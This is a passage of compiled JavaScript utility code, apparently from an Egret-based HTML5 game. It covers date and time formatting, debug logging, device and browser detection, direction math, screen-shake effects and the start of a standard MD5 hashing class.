    DateUtils.calcDiffDay = function (time1, time2) {
        var date1 = new Date(time1);
        date1.setHours(0);
        date1.setMinutes(0);
        date1.setSeconds(0);
        date1.setMilliseconds(0);
        var date2 = new Date(time2);
        date2.setHours(0);
        date2.setMinutes(0);
        date2.setSeconds(0);
        date2.setMilliseconds(0);
        var diffTime = date1.getTime() - date2.getTime();
        var day = diffTime > 0 ? diffTime / DateUtils.MS_PER_DAY : 0;
        return Math.floor(day);
    };
    DateUtils.getDayState = function (time1, time2) {
        var date1 = new Date(time1);
        var date2 = new Date(time2);
        var zeroSecond1 = DateUtils.getTodayZeroSecond(date1);
        var zeroSecond2 = DateUtils.getTodayZeroSecond(date2);
        return zeroSecond1 == zeroSecond2 ? 0 : date2.getTime() > date1.getTime() ? 1 : -1;
    };
    DateUtils.format_1 = function (ms) {
        var n = 0;
        var result = "##:##:##";
        n = Math.floor(ms / DateUtils.MS_PER_HOUR);
        result = result.replace("##", DateUtils.formatTimeNum(n));
        if (n)
            ms -= n * DateUtils.MS_PER_HOUR;
        n = Math.floor(ms / DateUtils.MS_PER_MINUTE);
        result = result.replace("##", DateUtils.formatTimeNum(n));
        if (n)
            ms -= n * DateUtils.MS_PER_MINUTE;
        n = Math.floor(ms / 1000);
        result = result.replace("##", DateUtils.formatTimeNum(n));
        return result;
    };
    DateUtils.format_2 = function (ms) {
        var date = new Date(ms);
        var year = date.getFullYear();
        var month = date.getMonth() + 1;
        var day = date.getDate();
        var hours = date.getHours();
        var minute = date.getMinutes();
        var second = date.getSeconds();
        return year + "-" + this.formatTimeNum(month) + "-" + this.formatTimeNum(day) + " " + this.formatTimeNum(hours) + ":" + this.formatTimeNum(minute) + ":" + this.formatTimeNum(second);
    };
    DateUtils.format_3 = function (ms) {
        var str = this.format_1(ms);
        var strArr = str.split(":");
        return strArr[1] + ":" + strArr[2];
    };
    DateUtils.format_4 = function (ms) {
        if (ms < this.MS_PER_HOUR) {
            return Math.floor(ms / this.MS_PER_MINUTE) + LangMgr.getValueByKey('dateTips1');
        }
        else if (ms < this.MS_PER_DAY) {
            return Math.floor(ms / this.MS_PER_HOUR) + LangMgr.getValueByKey('dateTips2');
        }
        return Math.floor(ms / this.MS_PER_DAY) + LangMgr.getValueByKey('dateTips3');
    };
    DateUtils.format_5 = function (ms, showLength, format) {
        if (showLength === void 0) { showLength = 2; }
        if (format === void 0) { format = true; }
        var result = "";
        var unitStr = [
            LangMgr.getValueByKey('activitDay', ''),
            LangMgr.getValueByKey('dateType1'),
            LangMgr.getValueByKey('activitMine', ''),
            LangMgr.getValueByKey('activitSS')
        ];
        var arr = [];
        var d = Math.floor(ms / this.MS_PER_DAY);
        arr.push(d);
        ms -= d * this.MS_PER_DAY;
        var h = Math.floor(ms / this.MS_PER_HOUR);
        arr.push(h);
        ms -= h * this.MS_PER_HOUR;
        var m = Math.floor(ms / this.MS_PER_MINUTE);
        arr.push(m);
        ms -= m * this.MS_PER_MINUTE;
        var s = Math.floor(ms / 1000);
        arr.push(s);
        for (var k in arr) {
            if (arr[k] > 0) {
                var formatStr = format ? this.formatTimeNum(arr[k], Number(k)) : arr[k].toString();
                result += formatStr + unitStr[k];
                showLength--;
                if (showLength <= 0) {
                    break;
                }
            }
        }
        return result;
    };
    DateUtils.format_6 = function (ms) {
        var date = new Date(ms);
        var hours = date.getHours();
        var minute = date.getMinutes();
        var second = date.getSeconds();
        return this.formatTimeNum(hours) + ":" + this.formatTimeNum(minute) + ":" + this.formatTimeNum(second);
    };
    DateUtils.format_7 = function (ms) {
        if (ms < this.MS_PER_HOUR) {
            return LangMgr.getValueByKey('dateTips4');
        }
        else if (ms < this.MS_PER_DAY) {
            return LangMgr.getValueByKey('activitHoure', Math.floor(ms / this.MS_PER_HOUR));
        }
        return LangMgr.getValueByKey('activitDay', Math.floor(ms / this.MS_PER_DAY));
    };
    DateUtils.format_8 = function (time) {
        var date = new Date(time);
        var year = date.getFullYear();
        var month = date.getMonth() + 1;
        var day = date.getDate();
        var hours = date.getHours();
        var minute = date.getMinutes();
        return year + "-" + month + "-" + day + " " + hours + ":" + minute;
    };
    DateUtils.format_9 = function (ms) {
        var h = Math.floor(ms / this.MS_PER_HOUR);
        ms -= h * this.MS_PER_HOUR;
        var m = Math.floor(ms / this.MS_PER_MINUTE);
        ms -= m * this.MS_PER_MINUTE;
        var s = Math.floor(ms / 1000);
        return LangMgr.getValueByKey('activitHoure', h) + LangMgr.getValueByKey('dateTips5', m) + LangMgr.getValueByKey('activitSS1', s);
    };
    DateUtils.format_10 = function (ms) {
        var m = Math.floor(ms / this.MS_PER_MINUTE);
        ms -= m * this.MS_PER_MINUTE;
        var s = Math.floor(ms / 1000);
        return LangMgr.getValueByKey('activitMine', m) + LangMgr.getValueByKey('activitSS1', s);
    };
    DateUtils.format_11 = function (ms) {
        var h = Math.floor(ms / this.MS_PER_HOUR);
        ms -= h * this.MS_PER_HOUR;
        var m = Math.floor(ms / this.MS_PER_MINUTE);
        ms -= m * this.MS_PER_MINUTE;
        var s = Math.floor(ms / 1000);
        return LangMgr.getValueByKey('activitHoure', h) + LangMgr.getValueByKey('activitMine', m) + LangMgr.getValueByKey('activitSS1', s);
    };
    DateUtils.format_12 = function (ms) {
        var h = Math.floor(ms / this.MS_PER_HOUR);
        ms -= h * this.MS_PER_HOUR;
        var m = Math.floor(ms / this.MS_PER_MINUTE);
        ms -= m * this.MS_PER_MINUTE;
        var s = Math.floor(ms / 1000);
        return DateUtils.formatTimeNum(h) + ":" + DateUtils.formatTimeNum(m) + ":" + DateUtils.formatTimeNum(s);
    };
    DateUtils.format_13 = function (time) {
        var date = new Date(time);
        var year = date.getFullYear();
        var month = date.getMonth() + 1;
        var week = date.getDay();
        var day = date.getDate();
        var hours = date.getHours();
        var minute = date.getMinutes();
        return LangMgr.getValueByKey('dateTips6', month, day, LangMgr.getValueByKey("weeksDay" + week), DateUtils.formatTimeNum(hours), DateUtils.formatTimeNum(minute));
    };
    DateUtils.format_14 = function (time) {
        var date = new Date(time);
        var hours = date.getHours();
        var minute = date.getMinutes();
        return LangMgr.getValueByKey('activitHoure', hours) + LangMgr.getValueByKey('activitMine', minute);
    };
    DateUtils.format_15 = function (time) {
        var date = new Date(time);
        var month = date.getMonth() + 1;
        var day = date.getDate();
        var hours = date.getHours();
        var minute = date.getMinutes();
        return DateUtils.formatTimeNum(month) + "-" + DateUtils.formatTimeNum(day) + " " + DateUtils.formatTimeNum(hours) + ":" + DateUtils.formatTimeNum(minute);
    };
    DateUtils.format_16 = function (time) {
        var date = new Date(time);
        var hours = date.getHours();
        var minute = date.getMinutes();
        return DateUtils.formatTimeNum(hours) + ":" + DateUtils.formatTimeNum(minute);
    };
    DateUtils.format_17 = function (time) {
        var date = new Date(time);
        var year = date.getFullYear();
        var month = date.getMonth() + 1;
        var day = date.getDate();
        var hours = date.getHours();
        var minute = date.getMinutes();
        return LangMgr.getValueByKey("timeFormat1", year, month, day, DateUtils.formatTimeNum(hours), DateUtils.formatTimeNum(minute));
    };
    DateUtils.format_18 = function (time) {
        var minute = time / 1000 / 60 >> 0;
        var second = time / 1000 % 60 >> 0;
        var millisecond = time % 1000 / 10 >> 0;
        return LangMgr.getValueByKey("timeFormat1", this.formatTimeNum(minute), this.formatTimeNum(second), this.formatTimeNum(millisecond));
    };
    DateUtils.format_19 = function (time) {
        if (time <= 0) {
            return "00:00";
        }
        var minute = Math.floor(time / 60);
        var second = time - 60 * minute;
        return this.formatTimeNum(minute, 1) + ":" + this.formatTimeNum(second, 1);
    };
    DateUtils.format_20 = function (time) {
        var date = new Date(time);
        var year = date.getFullYear();
        var month = date.getMonth() + 1;
        var day = date.getDate();
        return LangMgr.getValueByKey("timeFormat3", year, month, day);
    };
    DateUtils.formatTimeNum = function (t, k) {
        return t >= 10 ? t.toString() : (k == 0 ? t.toString() : "0" + t);
    };
    DateUtils.checkTime = function (time, days) {
        var currentDate = new Date().getTime();
        var t = (time > (currentDate + days * this.MS_PER_DAY));
        return t;
    };
    DateUtils.formatFullTime = function (time) {
        var format;
        var date = new Date(time);
        var year = date.getFullYear();
        var month = date.getMonth() + 1;
        var day = date.getDate();
        var weekDay = date.getDay();
        var hour = date.getHours();
        var hourStr;
        if (hour < 10) {
            hourStr = "0" + hour;
        }
        else {
            hourStr = hour.toString();
        }
        var min = date.getMinutes();
        var minStr;
        if (min < 10) {
            minStr = "0" + min;
        }
        else {
            minStr = min.toString();
        }
        var weekDayStr = LangMgr.getValueByKey("weeksDay" + weekDay);
        format = LangMgr.getValueByKey('dateTips7', year, month, day, weekDayStr, hourStr, minStr);
        return format;
    };
    DateUtils.formatStrTimeToMs = function (str) {
        var date = new Date();
        var strList = str.split(".");
        date.setFullYear(strList[0]);
        date.setMonth((+strList[1]) - 1);
        var strL2 = strList[2].split("-");
        date.setDate(strL2[0]);
        var strL3 = strL2[1].split(":");
        date.setHours(strL3[0]);
        date.setMinutes(strL3[1]);
        date.setSeconds(0);
        return date.getTime();
    };
    DateUtils.getDateTime = function (str) {
        var arr = str.split(/[-,.,:]/g);
        var date = new Date(+arr[0], +arr[1] - 1, +arr[2], +arr[3] || 0, +arr[4] || 0);
        return date;
    };
    DateUtils.TIME_FORMAT_1 = 1;
    DateUtils.TIME_FORMAT_2 = 2;
    DateUtils.TIME_FORMAT_3 = 3;
    DateUtils.TIME_FORMAT_4 = 4;
    DateUtils.TIME_FORMAT_5 = 5;
    DateUtils.TIME_FORMAT_6 = 6;
    DateUtils.TIME_FORMAT_7 = 7;
    DateUtils.TIME_FORMAT_8 = 8;
    DateUtils.TIME_FORMAT_9 = 9;
    DateUtils.TIME_FORMAT_10 = 10;
    DateUtils.TIME_FORMAT_11 = 11;
    DateUtils.TIME_FORMAT_12 = 12;
    DateUtils.TIME_FORMAT_13 = 13;
    DateUtils.TIME_FORMAT_14 = 14;
    DateUtils.TIME_FORMAT_15 = 15;
    DateUtils.TIME_FORMAT_16 = 16;
    DateUtils.TIME_FORMAT_17 = 17;
    DateUtils.TIME_FORMAT_18 = 18;
    DateUtils.TIME_FORMAT_19 = 19;
    DateUtils.TIME_FORMAT_20 = 20;
    DateUtils.MS_PER_SECOND = 1000;
    DateUtils.MS_PER_MINUTE = 60 * 1000;
    DateUtils.MS_PER_HOUR = 60 * 60 * 1000;
    DateUtils.MS_PER_DAY = 24 * 60 * 60 * 1000;
    DateUtils.MS_PER_WEEK = 7 * 24 * 60 * 60 * 1000;
    DateUtils.SECOND_PER_HOUR = 3600;
    DateUtils.SECOND_PER_DAY = 86400;
    DateUtils.SECOND_PER_MONTH = 2592000;
    DateUtils.SECOND_PER_YEAR = 31104000;
    DateUtils.DAYS_PER_WEEK = 7;
    DateUtils.YEAR_PER_YEAR = 1;
    DateUtils.MONTH_PER_YEAR = 12;
    DateUtils.DAYS_PER_MONTH = 30;
    DateUtils.HOURS_PER_DAY = 24;
    DateUtils.MUNITE_PER_HOUR = 60;
    DateUtils.SECOND_PER_MUNITE = 60;
    DateUtils.SECOND_PER_SECOND = 1;
    DateUtils.SECOND_2010 = 1262275200;
    DateUtils.mod = [DateUtils.SECOND_PER_MUNITE, DateUtils.MUNITE_PER_HOUR, DateUtils.HOURS_PER_DAY, DateUtils.DAYS_PER_MONTH, DateUtils.MONTH_PER_YEAR, DateUtils.YEAR_PER_YEAR];
    DateUtils.mul = [DateUtils.SECOND_PER_SECOND, DateUtils.SECOND_PER_MUNITE, DateUtils.SECOND_PER_HOUR, DateUtils.SECOND_PER_DAY, DateUtils.SECOND_PER_MONTH, DateUtils.SECOND_PER_YEAR];
    DateUtils.MINI_DATE_TIME_BASE = Date.UTC(2010, 0) + new Date().getTimezoneOffset() * DateUtils.MS_PER_MINUTE;
    DateUtils.TIME_ZONE_OFFSET = 8 * DateUtils.MS_PER_HOUR;
    DateUtils.TO_SECOND = 0;
    DateUtils.TO_MINUTE = 1;
    DateUtils.TO_HOUR = 2;
    DateUtils.TO_DAY = 3;
    DateUtils.TO_MONTH = 4;
    DateUtils.TO_YEAR = 5;
    DateUtils.FORMAT_2 = [":", ":", ":", ":", ":", ":"];
    DateUtils.STYLE_3 = new DateStyle(DateUtils.FORMAT_2, DateUtils.TO_SECOND, DateUtils.TO_HOUR, true);
    return DateUtils;
}());
__reflect(DateUtils.prototype, "DateUtils");
var DebugUtils = (function () {
    function DebugUtils() {
    }
    DebugUtils.log = function (msg) {
        var optionalParams = [];
        for (var _i = 1; _i < arguments.length; _i++) {
            optionalParams[_i - 1] = arguments[_i];
        }
        if (DebugUtils.OpenDebug) {
            egret.log.apply(egret, [msg].concat(optionalParams));
        }
    };
    DebugUtils.warn = function (msg) {
        var optionalParams = [];
        for (var _i = 1; _i < arguments.length; _i++) {
            optionalParams[_i - 1] = arguments[_i];
        }
        if (DebugUtils.OpenDebug) {
            egret.warn.apply(egret, [msg].concat(optionalParams));
        }
    };
    DebugUtils.error = function (msg) {
        var optionalParams = [];
        for (var _i = 1; _i < arguments.length; _i++) {
            optionalParams[_i - 1] = arguments[_i];
        }
        egret.error.apply(egret, [msg].concat(optionalParams));
    };
    DebugUtils.OpenRule = false;
    DebugUtils.OpenDebug = false;
    return DebugUtils;
}());
__reflect(DebugUtils.prototype, "DebugUtils");
var debug = {
    log: DebugUtils.log,
    warn: DebugUtils.warn,
    error: DebugUtils.error
};
var DeviceUtils = (function () {
    function DeviceUtils() {
    }
    Object.defineProperty(DeviceUtils, "IsHtml5", {
        get: function () {
            return egret.Capabilities.runtimeType == egret.RuntimeType.WEB;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(DeviceUtils, "IsNative", {
        get: function () {
            return egret.Capabilities.runtimeType == egret.RuntimeType.NATIVE;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(DeviceUtils, "IsWxMiniGame", {
        get: function () {
            return egret.Capabilities.runtimeType == egret.RuntimeType["WXGAME"];
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(DeviceUtils, "IsQqMiniGame", {
        get: function () {
            return egret.Capabilities.runtimeType == egret.RuntimeType["QQGAME"];
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(DeviceUtils, "IsUcMiniGame", {
        get: function () {
            return Boolean(window.uc);
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(DeviceUtils, "IsBluntBangs", {
        get: function () {
            return this.BluntBangs;
        },
        set: function (v) {
            this.BluntBangs = v;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(DeviceUtils, "IsMobile", {
        get: function () {
            return egret.Capabilities.isMobile;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(DeviceUtils, "IsPC", {
        get: function () {
            return !egret.Capabilities.isMobile;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(DeviceUtils, "IsQQBrowser", {
        get: function () {
            return this.IsHtml5 && navigator.userAgent.indexOf('MQQBrowser') != -1;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(DeviceUtils, "IsIEBrowser", {
        get: function () {
            return this.IsHtml5 && navigator.userAgent.indexOf("MSIE") != -1;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(DeviceUtils, "IsFirefoxBrowser", {
        get: function () {
            return this.IsHtml5 && navigator.userAgent.indexOf("Firefox") != -1;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(DeviceUtils, "IsChromeBrowser", {
        get: function () {
            return this.IsHtml5 && navigator.userAgent.indexOf("Chrome") != -1;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(DeviceUtils, "IsSafariBrowser", {
        get: function () {
            return this.IsHtml5 && navigator.userAgent.indexOf("Safari") != -1;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(DeviceUtils, "IsOperaBrowser", {
        get: function () {
            return this.IsHtml5 && navigator.userAgent.indexOf("Opera") != -1;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(DeviceUtils, "IsIPhone", {
        get: function () {
            return egret.Capabilities.isMobile && "iOS" == egret.Capabilities.os;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(DeviceUtils, "isWebgl", {
        get: function () {
            return egret.Capabilities.renderMode == "webgl";
        },
        enumerable: true,
        configurable: true
    });
    DeviceUtils.BluntBangs = false;
    return DeviceUtils;
}());
__reflect(DeviceUtils.prototype, "DeviceUtils");
var DirUtils = (function () {
    function DirUtils() {
    }
    DirUtils.get8DirBy2Point = function (startPoint, endPoint) {
        var angle = MathUtils.getAngle(MathUtils.getRadian2(startPoint.x, startPoint.y, endPoint.x, endPoint.y));
        return this.angle2dir(angle);
    };
    DirUtils.angle2dir = function (angle) {
        if (angle < -90) {
            angle += 360;
        }
        return Math.round((angle + 90) / 45) % 8;
    };
    DirUtils.get4DirBy2Point = function (startPoint, endPoint) {
        return startPoint.x < endPoint.x ? (startPoint.y < endPoint.y ? 3 : 1) : (startPoint.y < endPoint.y ? 5 : 7);
    };
    DirUtils.get5DirBy8Dir = function (dir8) {
        return dir8 - this.isScaleX(dir8);
    };
    DirUtils.isScaleX = function (dir8) {
        var td = 2 * (dir8 - 4);
        if (td < 0)
            td = 0;
        return td;
    };
    DirUtils.getGridByDir = function (dir, cellSize, pos, p) {
        if (pos === void 0) { pos = 1; }
        if (p === void 0) { p = { x: 0, y: 0 }; }
        var angle = this.dir2angle(this.dirOpposit(dir));
        return MathUtils.getDirMove(angle, pos * cellSize, p.x, p.y);
    };
    DirUtils.dir2angle = function (dir) {
        dir *= 45;
        dir -= 90;
        return dir;
    };
    DirUtils.dirOpposit = function (dir) {
        return dir < 4 ? dir + 4 : dir - 4;
    };
    return DirUtils;
}());
__reflect(DirUtils.prototype, "DirUtils");
var DisplayUtils = (function () {
    function DisplayUtils() {
    }
    DisplayUtils.setShakeOn = function ($on) {
        this.openShake = $on;
    };
    DisplayUtils.removeFromParent = function (child) {
        if (!child || child.parent == null) {
            return;
        }
        child.parent.removeChild(child);
    };
    DisplayUtils.shakeIt = function (target, range, duration, times, condition) {
        if (times === void 0) { times = 1; }
        if (condition === void 0) { condition = function () {
            return true;
        }; }
        if (!this.openShake || !target || times < 1 || !condition()) {
            return;
        }
        var shakeSet = [
            { anchorOffsetX: 0, anchorOffsetY: -range },
            { anchorOffsetX: 0, anchorOffsetY: +range },
            { anchorOffsetX: 0, anchorOffsetY: 0 },
        ];
        egret.Tween.removeTweens(target);
        var delay = duration / shakeSet.length;
        egret.Tween.get(target).to(shakeSet[0], delay).to(shakeSet[1], delay).to(shakeSet[2], delay).call(function () {
            DisplayUtils.shakeIt(target, range, duration, --times);
        }, this);
    };
    DisplayUtils.shakeItFocusAttack = function (target, range, duration, times, condition) {
        if (times === void 0) { times = 1; }
        if (condition === void 0) { condition = function () {
            return true;
        }; }
        if (!this.openShake || !target || times < 1 || !condition()) {
            return;
        }
        var shakeSet = [
            { anchorOffsetX: +range * 0.1, anchorOffsetY: +range },
            { anchorOffsetX: -range * 0.1, anchorOffsetY: -range },
            { anchorOffsetX: +range * 0.1, anchorOffsetY: +range },
            { anchorOffsetX: -range * 0.1, anchorOffsetY: -range },
            { anchorOffsetX: (+range >> 1) * 0.1, anchorOffsetY: +range >> 1 },
            { anchorOffsetX: (-range >> 1) * 0.1, anchorOffsetY: -range >> 1 },
            { anchorOffsetX: (+range >> 2) * 0.1, anchorOffsetY: +range >> 2 },
            { anchorOffsetX: 0, anchorOffsetY: 0 },
        ];
        egret.Tween.removeTweens(target);
        var delay = duration / shakeSet.length;
        egret.Tween.get(target).to(shakeSet[0], delay).to(shakeSet[1], delay).to(shakeSet[2], delay).to(shakeSet[3], delay).to(shakeSet[4], delay).to(shakeSet[5], delay).to(shakeSet[6], delay).to(shakeSet[7], delay).call(function () {
            DisplayUtils.shakeIt(target, range, duration, --times);
        }, this);
    };
    DisplayUtils.shakeItEntity = function (target, range, duration, times, condition) {
        var _this = this;
        if (times === void 0) { times = 1; }
        if (condition === void 0) { condition = function () {
            return true;
        }; }
        if (!this.openShake || !target || times < 1 || !condition()) {
            return;
        }
        var shakeSet = [
            { anchorOffsetX: 0, anchorOffsetY: -range },
            { anchorOffsetX: -range, anchorOffsetY: 0 },
            { anchorOffsetX: range, anchorOffsetY: 0 },
            { anchorOffsetX: 0, anchorOffsetY: range },
            { anchorOffsetX: 0, anchorOffsetY: 0 },
        ];
        egret.Tween.removeTweens(target);
        var delay = duration / 5;
        egret.Tween.get(target).to(shakeSet[0], delay).to(shakeSet[1], delay).to(shakeSet[2], delay).to(shakeSet[3], delay).to(shakeSet[4], delay).call(function () {
            _this.shakeIt(target, range, duration, --times);
        }, this);
    };
    DisplayUtils.drawCir = function (shape, radius, angle, anticlockwise, starAangle) {
        if (starAangle === void 0) { starAangle = 0; }
        if (shape == null) {
            shape = new egret.Shape();
        }
        else {
            shape.graphics.clear();
        }
        shape.graphics.beginFill(0x00ffff, 1);
        shape.graphics.moveTo(0, 0);
        shape.graphics.lineTo(radius, 0);
        shape.graphics.drawArc(0, 0, radius, starAangle, angle * Math.PI / 180, anticlockwise);
        shape.graphics.lineTo(0, 0);
        shape.graphics.endFill();
        return shape;
    };
    DisplayUtils.drawrect = function (shape, width, height, anticlockwise) {
        if (shape == null) {
            shape = new egret.Shape();
        }
        else {
            shape.graphics.clear();
        }
        shape.graphics.beginFill(0x00ffff, 1);
        shape.graphics.drawRect(0, 0, width, height);
        shape.graphics.endFill();
        return shape;
    };
    DisplayUtils.scrollerToBottom = function (scroller, value, tween) {
        scroller.viewport.validateNow();
        if (scroller.viewport.contentHeight > scroller.height) {
            var calcV = scroller.viewport.contentHeight - scroller.height;
            var scrollV = calcV;
            if (value && !isNaN(value)) {
                var val = value > scroller.height ? value - scroller.height : 0;
                scrollV = val > calcV ? calcV : val;
            }
            if (tween) {
                egret.Tween.get(scroller.viewport).to({
                    scrollV: scrollV
                }, 100);
            }
            else {
                scroller.viewport.scrollV = scrollV;
            }
        }
    };
    DisplayUtils.openShake = true;
    return DisplayUtils;
}());
__reflect(DisplayUtils.prototype, "DisplayUtils");
var EncryptMd5 = (function () {
    function EncryptMd5() {
    }
    EncryptMd5.hex_md5 = function (s) {
        return this.rstr2hex(this.rstr_md5(this.str2rstr_utf8(s)));
    };
    EncryptMd5.b64_md5 = function (s) {
        return this.rstr2b64(this.rstr_md5(this.str2rstr_utf8(s)));
    };
    EncryptMd5.any_md5 = function (s, e) {
        return this.rstr2any(this.rstr_md5(this.str2rstr_utf8(s)), e);
    };
    EncryptMd5.hex_hmac_md5 = function (k, d) {
        return this.rstr2hex(this.rstr_hmac_md5(this.str2rstr_utf8(k), this.str2rstr_utf8(d)));
    };
    EncryptMd5.b64_hmac_md5 = function (k, d) {
        return this.rstr2b64(this.rstr_hmac_md5(this.str2rstr_utf8(k), this.str2rstr_utf8(d)));
    };
    EncryptMd5.any_hmac_md5 = function (k, d, e) {
        return this.rstr2any(this.rstr_hmac_md5(this.str2rstr_utf8(k), this.str2rstr_utf8(d)), e);
    };
    EncryptMd5.md5_vm_test = function () {
        return this.hex_md5("abc").toLowerCase() == "900150983cd24fb0d6963f7d28e17f72";
    };
    EncryptMd5.rstr_md5 = function (s) {
        return this.binl2rstr(this.binl_md5(this.rstr2binl(s), s.length * 8));
    };
    EncryptMd5.rstr_hmac_md5 = function (key, data) {
        var bkey = this.rstr2binl(key);
        if (bkey.length > 16)
            bkey = this.binl_md5(bkey, key.length * 8);
        var ipad = Array(16), opad = Array(16);
        for (var i = 0; i < 16; i++) {
            ipad[i] = bkey[i] ^ 0x36363636;
            opad[i] = bkey[i] ^ 0x5C5C5C5C;
        }
        var hash = this.binl_md5(ipad.concat(this.rstr2binl(data)), 512 + data.length * 8);
        return this.binl2rstr(this.binl_md5(opad.concat(hash), 512 + 128));
    };
    EncryptMd5.rstr2hex = function (input) {
        try {
            this.hexcase;
        }
        catch (e) {
            this.hexcase = 0;
        }
        var hex_tab = this.hexcase ? "0123456789ABCDEF" : "0123456789abcdef";
        var output = "";
        var x;
        for (var i = 0; i < input.length; i++) {
            x = input.charCodeAt(i);
            output += hex_tab.charAt((x >>> 4) & 0x0F) + hex_tab.charAt(x & 0x0F);
        }
        return output;
    };
    EncryptMd5.rstr2b64 = function (input) {
        try {
            this.b64pad;
        }
        catch (e) {
            this.b64pad = '';
        }
        var tab = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        var output = "";
        var len = input.length;
        for (var i = 0; i < len; i += 3) {
            var triplet = (input.charCodeAt(i) << 16)
                | (i + 1 < len ? input.charCodeAt(i + 1) << 8 : 0)
                | (i + 2 < len ? input.charCodeAt(i + 2) : 0);
            for (var j = 0; j < 4; j++) {
                if (i * 8 + j * 6 > input.length * 8)
                    output += this.b64pad;
                else
                    output += tab.charAt((triplet >>> 6 * (3 - j)) & 0x3F);
            }
        }
        return output;
    };
    EncryptMd5.rstr2any = function (input, encoding) {
        var divisor = encoding.length;
        var i, j, q, x, quotient;
        var dividend = Array(Math.ceil(input.length / 2));
        for (i = 0; i < dividend.length; i++) {
            dividend[i] = (input.charCodeAt(i * 2) << 8) | input.charCodeAt(i * 2 + 1);
        }
        var full_length = Math.ceil(input.length * 8 /
            (Math.log(encoding.length) / Math.log(2)));
        var remainders = Array(full_length);
        for (j = 0; j < full_length; j++) {
            quotient = Array();
            x = 0;
            for (i = 0; i < dividend.length; i++) {
                x = (x << 16) + dividend[i];
                q = Math.floor(x / divisor);
                x -= q * divisor;
                if (quotient.length > 0 || q > 0)
                    quotient[quotient.length] = q;
            }
            remainders[j] = x;
            dividend = quotient;
        }
        var output = "";
        for (i = remainders.length - 1; i >= 0; i--)
            output += encoding.charAt(remainders[i]);
        return output;
    };
    EncryptMd5.str2rstr_utf8 = function (input) {
        var output = "";
        var i = -1;
        var x, y;
        while (++i < input.length) {
            x = input.charCodeAt(i);
            y = i + 1 < input.length ? input.charCodeAt(i + 1) : 0;
            if (0xD800 <= x && x <= 0xDBFF && 0xDC00 <= y && y <= 0xDFFF) {
                x = 0x10000 + ((x & 0x03FF) << 10) + (y & 0x03FF);
                i++;
            }
            if (x <= 0x7F)
                output += String.fromCharCode(x);
            else if (x <= 0x7FF)
                output += String.fromCharCode(0xC0 | ((x >>> 6) & 0x1F), 0x80 | (x & 0x3F));
            else if (x <= 0xFFFF)
                output += String.fromCharCode(0xE0 | ((x >>> 12) & 0x0F), 0x80 | ((x >>> 6) & 0x3F), 0x80 | (x & 0x3F));
            else if (x <= 0x1FFFFF)
                output += String.fromCharCode(0xF0 | ((x >>> 18) & 0x07), 0x80 | ((x >>> 12) & 0x3F), 0x80 | ((x >>> 6) & 0x3F), 0x80 | (x & 0x3F));
        }
        return output;
    };
    EncryptMd5.str2rstr_utf16le = function (input) {
        var output = "";
        for (var i = 0; i < input.length; i++)
            output += String.fromCharCode(input.charCodeAt(i) & 0xFF, (input.charCodeAt(i) >>> 8) & 0xFF);
        return output;
    };
    EncryptMd5.str2rstr_utf16be = function (input) {
        var output = "";
        for (var i = 0; i < input.length; i++)
            output += String.fromCharCode((input.charCodeAt(i) >>> 8) & 0xFF, input.charCodeAt(i) & 0xFF);
        return output;
    };
    EncryptMd5.rstr2binl = function (input) {
        var output = Array(input.length >> 2);
        for (var i = 0; i < output.length; i++)
            output[i] = 0;
        for (var i = 0; i < input.length * 8; i += 8)
            output[i >> 5] |= (input.charCodeAt(i / 8) & 0xFF) << (i % 32);
        return output;
    };
    EncryptMd5.binl2rstr = function (input) {
        var output = "";
        for (var i = 0; i < input.length * 32; i += 8)
            output += String.fromCharCode((input[i >> 5] >>> (i % 32)) & 0xFF);
        return output;
    };
    EncryptMd5.binl_md5 = function (x, len) {
        x[len >> 5] |= 0x80 << ((len) % 32);
        x[(((len + 64) >>> 9) << 4) + 14] = len;
        var a = 1732584193;
        var b = -271733879;
        var c = -1732584194;
        var d = 271733878;
        for (var i = 0; i < x.length; i += 16) {
            var olda = a;
            var oldb = b;
            var oldc = c;
            var oldd = d;
            a = this.md5_ff(a, b, c, d, x[i + 0], 7, -680876936);
            d = this.md5_ff(d, a, b, c, x[i + 1], 12, -389564586);
            c = this.md5_ff(c, d, a, b, x[i + 2], 17, 606105819);
            b = this.md5_ff(b, c, d, a, x[i + 3], 22, -1044525330);
            a = this.md5_ff(a, b, c, d, x[i + 4], 7, -176418897);
            d = this.md5_ff(d, a, b, c, x[i + 5], 12, 1200080426);
            c = this.md5_ff(c, d, a, b, x[i + 6], 17, -1473231341);
            b = this.md5_ff(b, c, d, a, x[i + 7], 22, -45705983);
            a = this.md5_ff(a, b, c, d, x[i + 8], 7, 1770035416);
            d = this.md5_ff(d, a, b, c, x[i + 9], 12, -1958414417);
            c = this.md5_ff(c, d, a, b, x[i + 10], 17, -42063);
            b = this.md5_ff(b, c, d, a, x[i + 11], 22, -1990404162);
            a = this.md5_ff(a, b, c, d, x[i + 12], 7, 1804603682);
            d = this.md5_ff(d, a, b, c, x[i + 13], 12, -40341101);
            c = this.md5_ff(c, d, a, b, x[i + 14], 17, -1502002290);
            b = this.md5_ff(b, c, d, a, x[i + 15], 22, 1236535329);
            a = this.md5_gg(a, b, c, d, x[i + 1], 5, -165796510);
            d = this.md5_gg(d, a, b, c, x[i + 6], 9, -1069501632);
            c = this.md5_gg(c, d, a, b, x[i + 11], 14, 643717713);
            b = this.md5_gg(b, c, d, a, x[i + 0], 20, -373897302);
            a = this.md5_gg(a, b, c, d, x[i + 5], 5, -701558691);
            d = this.md5_gg(d, a, b, c, x[i + 10], 9, 38016083);
            c = this.md5_gg(c, d, a, b, x[i + 15], 14, -660478335);
            b = this.md5_gg(b, c, d, a, x[i + 4], 20, -405537848);
            a = this.md5_gg(a, b, c, d, x[i + 9], 5, 568446438);
